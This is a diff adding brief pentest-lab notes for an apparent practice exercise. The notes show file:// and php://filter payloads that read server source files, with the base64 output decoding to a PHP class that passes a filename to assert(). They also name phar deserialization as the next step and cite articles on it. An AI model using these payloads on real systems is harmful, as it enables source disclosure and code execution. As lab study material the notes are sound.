@@ -1,0 +1,34 @@
+https://google.com
+http://ptl-25a552f5-558f2c36.libcurl.so/index.php
+http://ptl-25a552f5-558f2c36.libcurl.so/uploads/12860249565f34d6ddcc9b19.82615565
+
+since the files are returned as-is, we can't see the php code
+therefore we use the file:// protocol to extract the source
+
+file://ptl-25a552f5-558f2c36.libcurl.so/index.php
+remote files are not supported
+
+file://localhost/index.php
+No such file or directory in /var/www/index.php on line 8
+
+REMEMBER TO VIEW-SOURCE:
+file:///var/www/index.php
+file:///var/www/header.php
+file:///var/www/footer.php
+file:///var/www/classes/phpfix.php
+file:///var/www/classes/file.php
+
+FILTERS:
+php://filter/convert.base64-encode/resource=/var/www/classes/file.php
+PD9waHAKCmNsYXNzIFVwbG9hZEZpbGUgewogIHB1YmxpYyAkZmlsZW5hbWU7CiAgZnVuY3Rpb24gX19kZXN0cnVjdCgpIHsKICAgIC8vIGNoZWNrIGZpbGVuYW1lCiAgICBhc3NlcnQodHJpbSgiJyIuJHRoaXMtPmZpbGVuYW1lLiInIikpOwogIH0KfQo/Pgo=
+
+
+1. phar
+2. 
+
+RESOURCES:
+https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-1
+https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-2
+https://blog.ripstech.com/2018/new-php-exploitation-technique/
+https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf
+
